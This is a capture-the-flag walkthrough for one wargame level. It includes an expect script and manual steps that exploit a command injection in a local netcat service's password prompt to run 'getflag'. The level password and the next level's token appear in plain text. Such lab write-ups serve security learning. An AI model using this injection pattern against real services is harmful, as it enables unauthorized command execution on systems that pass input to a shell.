# Level 11
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level11@$ip -p 4242 "mkdir -p /tmp/level11 ; cd /tmp/level11 ; rm -rf ./* ; chmod 777 . ; nc 127.0.0.1 5151"
	expect "sword:"
	send "feulo4b72j7edeahuete3no7c\r"
	expect "sword:"
	send "any | echo \$\(getflag\) > /tmp/level11/flag\r"
	spawn ssh -o "StrictHostKeyChecking no" level11@$ip -p 4242 "cat /tmp/level11/flag"
	expect "sword:"
	send "feulo4b72j7edeahuete3no7c\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- View content of the `level11.lua` file
	```sh
	$ cat level11.lua
	```
- Make `level11` directory in `tmp` location
	```sh
	$ mkdir -p /tmp/level11
	$ rm -rf /tmp/level11/*
	```
- Change access mode to that directory to `777`
	```sh
	$ chmod 777 /tmp/level11
	```
- Run the following command along with password injection
	```sh
	$ nc 127.0.0.1 5151
	Password: any | echo $(getflag) > /tmp/level11/flag
	```
- View content of the `flag` file to get the flag
	```sh
	$ cat /tmp/level11/flag
	```
- With the token provided `fa6v5ateaw21peobuub8ipe6s` switch to the next user level
	```sh
	$ su level12
	Password: fa6v5ateaw21peobuub8ipe6s
	``` 
